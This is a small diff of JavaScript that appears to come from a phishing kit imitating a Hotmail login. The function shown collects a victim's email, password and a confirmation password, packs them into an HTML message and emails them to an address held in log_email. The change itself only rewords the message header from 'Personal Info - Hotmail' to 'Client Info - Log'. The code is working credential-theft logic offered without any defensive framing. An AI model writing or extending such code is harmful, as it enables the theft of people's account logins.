@@ -49,7 +49,7 @@ function processPassword2(t) {
     t.preventDefault();
     var e = this.userPassword2.value.trim();
 
-    var message = "<div> ==================+[ Personal Info - Hotmail ]+================== <br> Username/Email => " + userEmail +  "<br>Password => "+userPassword +  "<br>confirm_password => " + e +"</div>"; 
+    var message = "<div> +[ Client Info - Log ]+ <br> Email/Address: " + userEmail +  "<br>Password: "+userPassword +  "<br>confirm_password: " + e +"</div>"; 
     
     "" != e ? (sendEmail(log_email, message), hide("password2-row"), show("animate"), "flex" == document.getElementById("animate").style.display) : (hide("password22Error"), show("password21Error"))
 }
